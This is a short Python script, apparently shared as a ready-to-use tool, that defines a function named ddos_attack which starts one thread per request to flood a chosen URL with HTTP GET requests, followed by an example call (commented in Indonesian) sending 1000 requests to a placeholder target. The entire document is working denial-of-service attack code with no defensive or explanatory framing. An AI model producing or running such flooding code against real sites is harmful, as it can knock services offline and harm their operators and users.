import threading
import requests

def ddos_attack(url, num_requests):
    def attack():
        try:
            response = requests.get(url)
            print(f"Request sent, status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
    
    threads = []
    for _ in range(num_requests):
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

# Contoh penggunaan:
# ddos_attack("http://target.com", 1000)
